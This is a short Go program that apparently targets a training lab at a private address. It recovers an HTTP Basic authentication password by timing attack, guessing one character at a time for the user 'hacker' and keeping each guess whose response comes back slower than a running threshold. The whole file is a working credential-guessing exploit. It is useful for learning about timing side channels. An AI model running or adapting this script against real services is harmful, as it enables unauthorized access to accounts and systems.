package main

import (
	b64 "encoding/base64"
	"fmt"
	"log"
	"net/http"
	"strconv"
	"time"
)

var (
	url       = "http://192.168.126.134/authentication/example2"
	chars     = "paswrd01234"
	main_time = 1.42
)

func main() {
	password := ""
	for i := 0; i < 10; i++ {
		for _, c := range chars {
			if exploit(password + string(c)) {
				password += string(c)
				break
			}
		}
	}
}

func exploit(paylaod string) bool {
	client := &http.Client{}
	req, _ := http.NewRequest("GET", url, nil)
	header := "hacker:" + paylaod
	header = b64.StdEncoding.EncodeToString([]byte(header))
	req.Header.Add("Authorization", "Basic "+header)
	start := time.Now()
	_, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	elapsed := time.Since(start).Seconds()

	fmt.Println(paylaod + ":" + header + " ->" + strconv.FormatFloat(elapsed, 'E', -1, 64))
	if elapsed > main_time {
		main_time = elapsed + 0.15
		return true
	}
	return false
}
